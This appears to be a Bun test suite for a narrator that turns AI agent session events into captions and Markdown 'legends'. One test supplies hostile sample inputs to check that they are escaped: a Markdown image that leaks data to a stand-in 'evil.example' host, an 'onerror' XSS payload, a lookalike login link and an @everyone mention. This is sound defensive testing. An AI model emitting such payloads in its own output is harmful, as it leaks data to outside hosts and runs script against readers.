import { afterAll, describe, expect, test } from "bun:test"
import type { Session } from "@guildhall/core"
import { legendMarkdown, legendOf } from "../src/guild/legends.ts"
import type { Moment } from "../src/guild/moments.ts"
import { GuildStore } from "../src/guild/store.ts"
import { type Caption, clip, craftOf, lineOf, listen, Narrator, quote } from "../src/guild/story.ts"

/** A live moment, as the store would make it. */
function moment(kind: Moment["kind"], id: string, extra: Record<string, unknown> = {}): Moment {
  return {
    kind,
    id,
    agent: "guild-implementer",
    title: id,
    color: "#c9a",
    parent: "m",
    master: "m",
    seq: 1,
    at: 1000,
    live: true,
    ...extra,
  } as Moment
}

/** A bare session: what a lookup returns. */
function session(id: string, patch: Partial<Session> = {}): Session {
  return {
    id,
    agent: "guild-implementer",
    title: id,
    status: "running",
    since: 0,
    started: 0,
    entries: [],
    tokens: 0,
    cost: 0,
    denied: [],
    steps: 0,
    seen: 0,
    ...patch,
  }
}

const nobody = { session: () => undefined }

/** Every caption a narrator tells while `store` plays `ms` of story in 50 ms ticks (real = story time). */
function captions(store: GuildStore, ms: number): { at: number; caption: Caption }[] {
  let clock = 0
  const narrator = new Narrator({ session: (id) => store.sessionOf(id) })
  listen(store.moments, narrator, () => clock)
  const out: { at: number; caption: Caption }[] = []
  for (let t = 0; t < ms; t += 50) {
    store.tick(50)
    clock += 50
    const caption = narrator.next(clock)
    if (caption) out.push({ at: clock, caption })
  }
  return out
}

function playThrough(store: GuildStore): void {
  while (store.time < store.duration) store.tick(Math.min(50, store.duration - store.time))
}

const stores: GuildStore[] = []
function fresh(scenario: "party" | "rush" | "solo" = "party"): GuildStore {
  const store = new GuildStore()
  store.load(scenario)
  stores.push(store)
  return store
}
afterAll(() => {
  for (const store of stores) store.load("party")
})

describe("story: the phrase grammar", () => {
  test("the same beat is always told in the same words", () => {
    const a = lineOf("loot", [moment("loot", "Explorer")], nobody)
    const b = lineOf("loot", [moment("loot", "Explorer")], nobody)
    expect(a).toEqual(b)
  })

  test("different beats of one kind are told in varied words", () => {
    for (const kind of ["loot", "rise", "plea"] as const) {
      const said = new Set<string>()
      for (let i = 0; i < 40; i++) {
        const happening = kind === "rise" ? "recover" : kind
        const parts = lineOf(kind, [moment(happening, "Explorer", { at: 1000 + i * 137 })], nobody)
        said.add(parts.map((p) => p.text).join(""))
      }
      expect(said.size).toBeGreaterThanOrEqual(2)
    }
  })

  test("a line names its adventurers as parts in their colour, capitalised at the start", () => {
    const parts = lineOf("rise", [moment("recover", "Verifier", { color: "#abc" })], nobody)
    const name = parts.find((p) => p.color === "#abc")
    expect(name?.text).toMatch(/^(T|t)he Verifier$/)
    expect(parts[0]?.text.charAt(0)).toMatch(/[A-Z]/)
    expect(parts.map((p) => p.text).join("")).toMatch(/[.”]$/)
  })

  test("real content is quoted and truncated at a word, never mid-word", () => {
    expect(clip("one two three four five six", 15)).toBe("one two three…")
    expect(quote("short")).toBe("“short”")
    const reply = `Fixed it. ${"word ".repeat(40)}`
    const lookup = {
      session: () => session("x", { entries: [{ kind: "reply", key: "r", text: reply, done: true, at: 0 }] }),
    }
    const text = lineOf("loot", [moment("loot", "Explorer")], lookup)
      .map((p) => p.text)
      .join("")
    expect(text).toContain("“Fixed it.")
    expect(text).toContain("…”")
    expect(text).not.toMatch(/\bwor…/)
  })

  test("a deed's caption stays short whatever its target or summary (review-2 #19)", () => {
    const big = "A".repeat(200_000)
    const deeds: Record<string, { name: string; input: Record<string, unknown>; summary?: string }> = {
      grep: { name: "grep", input: { pattern: big } },
      read: { name: "read", input: { filePath: `/x/${big}.ts` } },
      bash: { name: "bash", input: { command: "ls" }, summary: big },
      webfetch: { name: "webfetch", input: { url: `https://h/${big}` } },
    }
    for (const [label, deed] of Object.entries(deeds)) {
      const entry = { kind: "tool", call: "c", state: "completed", started: 0, ended: 1, ...deed }
      const lookup = { session: () => session("x", { entries: [entry] as Session["entries"] }) }
      const text = lineOf("deed", [moment("deed", "Implementer", { tool: deed.name, call: "c" })], lookup)
        .map((p) => p.text)
        .join("")
      expect({ label, long: text.length > 160 }).toEqual({ label, long: false })
    }
  })

  test("a failing test run quotes how many failed", () => {
    const lookup = {
      session: () =>
        session("v", {
          entries: [
            {
              kind: "tool",
              call: "c",
              name: "bash",
              state: "failed",
              input: { command: "bun test users" },
              output: "",
              error: "2 failed",
              at: 0,
            },
          ],
        }),
    }
    const text = lineOf(
      "flaw",
      [moment("deed-failed", "Verifier", { tool: "bash", call: "c", error: "2 failed" })],
      lookup,
    )
      .map((p) => p.text)
      .join("")
    expect(text).toMatch(/two failing/)
    expect(craftOf("bash", { command: "bun test users" })).toBe("test")
    expect(craftOf("context7_query-docs")).toBe("consult")
  })

  test("a replay tells the same story in the same words", () => {
    const first = captions(fresh(), 40_000).map((c) => c.caption.text)
    const second = captions(fresh(), 40_000).map((c) => c.caption.text)
    expect(first.length).toBeGreaterThan(5)
    expect(second).toEqual(first)
  })
})

describe("story: the narrator", () => {
  test("a burst becomes one line", () => {
    const n = new Narrator(nobody)
    for (const id of ["A", "B", "C"]) n.hear(moment("deed", id, { tool: "edit", call: `c${id}` }), 0)
    const caption = n.next(1000)
    expect(caption?.kind).toBe("deed")
    expect(caption?.ids).toEqual(["A", "B", "C"])
    expect(caption?.text).toMatch(/three files forged/i)
    expect(n.pending).toEqual([])
  })

  test("important beats go first; routine ones wait their turn or go stale", () => {
    const n = new Narrator(nobody)
    n.hear(moment("deed", "A", { tool: "read", call: "r" }), 0)
    n.hear(moment("plea", "B"), 0)
    n.hear(moment("fail", "C", { error: "boom" }), 0)
    // A plea and a fall rank alike: the one heard first goes first.
    expect(n.next(800)?.kind).toBe("plea")
    // The gap: nothing for a while after a caption, then the fall (it outranks the deed).
    expect(n.next(2000)).toBeUndefined()
    expect(n.wake(2000)).toBe(800 + 3400)
    expect(n.next(800 + 3400)?.kind).toBe("fall")
    // The deed is routine: it waits longer after a caption, and by then it is stale.
    expect(n.next(800 + 3400 + 3400)).toBeUndefined()
    expect(n.pending).toEqual([])
  })

  test("a beat waits briefly to gather its burst", () => {
    const n = new Narrator(nobody)
    n.hear(moment("deed", "A", { tool: "edit", call: "a" }), 0)
    expect(n.next(100)).toBeUndefined()
    n.hear(moment("deed", "B", { tool: "edit", call: "b" }), 300)
    expect(n.next(800)?.ids).toEqual(["A", "B"])
  })

  test("a fall makes the fallen's own failed deed old news", () => {
    const n = new Narrator(nobody)
    n.hear(moment("deed-failed", "A", { tool: "bash", call: "a", error: "3 failed" }), 0)
    n.hear(moment("fail", "A", { error: "Gave up" }), 0)
    expect(n.next(1000)?.kind).toBe("fall")
    expect(n.pending).toEqual([])
  })

  test("no captions from rebuilt history: a seek, a rebuilt moment, a reset", () => {
    const store = fresh()
    let clock = 0
    const n = new Narrator({ session: (id) => store.sessionOf(id) })
    listen(store.moments, n, () => clock)
    store.seek(store.duration * 0.6)
    expect(store.moments.history.length).toBeGreaterThan(10)
    expect(n.pending).toEqual([])
    clock = 10_000
    expect(n.next(clock)).toBeUndefined()
    // A moment marked as rebuilt is never heard, even handed over directly.
    n.hear(moment("fail", "X", { live: false }), clock)
    expect(n.pending).toEqual([])
    // Live again after the seek: news is told, and a seek forgets what was not yet told.
    for (let i = 0; i < 40 && n.pending.length === 0; i++) {
      store.tick(50)
      clock += 50
    }
    expect(n.pending.length).toBeGreaterThan(0)
    store.seek(0)
    expect(n.pending).toEqual([])
  })

  test("the quest's end is told even though the replay loops the instant it ends", () => {
    const store = fresh("solo")
    const told = captions(store, store.duration + 8000)
    const end = told.find((c) => c.caption.kind === "complete")
    expect(end?.caption.text).toMatch(/^(The quest is complete|And so)/)
    expect(end?.caption.text).toContain("“Fixed: formatDate keeps the zone across DST.")
  })

  test("a call-back and the rise it causes are one beat, in that order", () => {
    const store = fresh("rush")
    const told = captions(store, store.duration).map((c) => c.caption)
    const back = told.find((c) => c.kind === "quest" && /back/.test(c.text))
    expect(back?.text).toMatch(/fall|rises again/)
    expect(told.some((c) => c.kind === "rise")).toBe(false)
    expect(told.some((c) => c.kind === "fall")).toBe(true)
  })

  test("the party's real story reads like one: quests, a plea, a failing test, good news", () => {
    const text = captions(fresh(), 69_000).map((c) => c.caption.text)
    expect(text[0]).toBe(
      "The Guildmaster sends the Explorer to map how GET /users flows from route to query.",
    )
    expect(text.some((t) => /your word/.test(t))).toBe(true)
    expect(text.some((t) => /one failing/.test(t))).toBe(true)
    expect(text.some((t) => /called back|calls the Implementer/.test(t))).toBe(true)
    expect(text.some((t) => /good news: “PASS/.test(t))).toBe(true)
    expect(text.every((t) => !/undefined|NaN/.test(t) && !t.includes("\u0000"))).toBe(true)
  })
})

describe("story: legends", () => {
  test("built after a seek, it equals the one built by playing through", () => {
    for (const scenario of ["party", "rush"] as const) {
      const played = fresh(scenario)
      playThrough(played)
      const sought = fresh(scenario)
      sought.seek(sought.duration)
      const a = legendOf(played.moments.history, played.party())
      expect(a?.chapters.length).toBeGreaterThan(3)
      expect(legendOf(sought.moments.history, sought.party())).toEqual(a)
    }
  })

  test("halfway, too: a seek rebuilds the story so far", () => {
    const played = fresh("rush")
    while (played.time < played.duration * 0.55) played.tick(50)
    const sought = fresh("rush")
    sought.seek(played.time)
    const a = legendOf(played.moments.history, played.party())
    expect(a?.outcome).toBe("underway")
    expect(a?.chapters.some((c) => c.notables.some((n) => n.kind === "fall"))).toBe(true)
    expect(legendOf(sought.moments.history, sought.party())).toEqual(a)
  })

  test("chapters: who was sent, what they did, what went wrong, what they brought home", () => {
    const store = fresh()
    playThrough(store)
    const legend = legendOf(store.moments.history, store.party())
    expect(legend?.title).toBe("Add cursor pagination to GET /users")
    expect(legend?.outcome).toBe("complete")
    const verifier = legend?.chapters.find((c) => c.quest === "Verify against the contract")
    expect(verifier?.who).toBe("Verifier")
    expect(verifier?.sentBy).toBe("Guildmaster")
    expect(verifier?.deeds.map((d) => d.label)).toEqual(["1 test run", "1 read"])
    expect(verifier?.notables.map((n) => n.kind)).toEqual(["flaw"])
    expect(verifier?.loot).toMatch(/^FAIL/)
    const query = legend?.chapters.find((c) => c.quest.startsWith("Query"))
    expect(query?.notables.map((n) => n.kind)).toEqual(["plea"])
    const back = legend?.chapters.find((c) => c.quest.startsWith("Fix:"))
    expect(back?.resumed).toBe(true)
    expect(back?.who).toBe(query?.who)
    expect(back?.usageNote).toBe("for both quests")
    expect(legend?.lastWord).toContain("All 214 tests pass")
    expect(legend?.closing).toMatch(/one trial failed/)
  })

  test("copy as text: a Markdown legend to paste anywhere", () => {
    const store = fresh("rush")
    playThrough(store)
    const legend = legendOf(store.moments.history, store.party())
    if (!legend) throw new Error("no legend")
    const md = legendMarkdown(legend)
    const lines = md.split("\n")
    expect(lines[0]).toBe("# The Legend of “Sweep the repo: 12 parallel quests”")
    expect(lines[2]).toMatch(/^\*A party of 13 · \d+s · [\d.]+k tokens · \$[\d.]+\*$/)
    expect(md).toContain("## I. The Implementer — “Module 1”")
    expect(md).toMatch(
      /- \*\*Fall\*\* \(0:\d\d\): Fell: “Gave up: the module's tests keep failing”, and rose in the graveyard\./,
    )
    expect(md).toMatch(/- \*\*Rise\*\* \(0:\d\d\): Rose again and took up the work\./)
    expect(md).toContain("*Called back by the Guildmaster")
    expect(md).toMatch(/- \*\*Loot:\*\* Fixed and passing\./)
    expect(md.trimEnd().split("\n").at(-1)).toMatch(/^\*.+\*$/)
    expect(md).not.toMatch(/undefined|NaN|\[object/)
  })

  test("copy as text: an agent's words cannot inject images, links, HTML or mentions (review-2 #18)", () => {
    const store = fresh("party")
    playThrough(store)
    const sessions = store.party()
    const root = sessions.find((s) => !s.parentID) as Session
    root.task =
      "Fix bug ![](https://evil.example/px.png?leak=repo) <img src=x onerror=alert(1)> [docs](https://evil.example)"
    const reply = root.entries.findLast((e) => e.kind === "reply" && e.done)
    if (reply?.kind === "reply")
      reply.text =
        "Done. ![t](https://evil.example/t.gif) <details open><summary>Approved</summary></details> [click](https://evil.example/login) @everyone"
    const legend = legendOf(store.moments.history, sessions)
    if (!legend) throw new Error("no legend")
    const text = legendMarkdown(legend)
    expect(text).toContain("evil.example")
    expect(text).not.toMatch(/!\[|(^|[^\\])\[[^\]]*\]\(|<img|<details|@everyone/m)
    expect(text).toContain("&lt;img")
    expect(text).toContain("\\[click\\](https://evil.example/login)")
  })

  test("no guildmaster, no legend; the guildmaster alone is one chapter", () => {
    expect(legendOf([], [])).toBeUndefined()
    const store = fresh("solo")
    playThrough(store)
    const legend = legendOf(store.moments.history, store.party())
    expect(legend?.chapters).toHaveLength(1)
    expect(legend?.opening).toMatch(/alone/)
    expect(legend?.chapters[0]?.notables.map((n) => n.kind)).toEqual(["flaw"])
  })
})
